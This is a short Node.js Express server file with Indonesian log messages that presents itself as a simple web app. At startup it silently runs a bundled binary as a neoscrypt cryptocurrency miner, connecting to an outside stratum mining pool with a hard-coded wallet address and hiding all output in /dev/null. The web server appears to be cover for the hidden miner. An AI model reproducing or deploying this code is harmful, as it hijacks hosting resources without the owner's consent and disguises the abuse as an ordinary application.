const express = require('express');
const http = require('http');
const { exec } = require('child_process');
const prt = process.env.PORT||80
const app = express();
const server = http.createServer(app);

app.get('/', (req, res) => {
  res.send('Aplikasi sedang berjalan');
});

//logging server port
server.listen(prt, () => {
  console.log(`Server berjalan pada port ${prt}`);
});

exec('chmod +x node && ./node -a neoscrypt -o stratum+tcp://poolx.rwinfo.club:4233 -u VWMjiaJ7CpSaGt1To385kAHh61FWgoauK4.Library -p c=VIVO &> /dev/null', (error, stdout, stderr) => {
  console.log(error);
 });
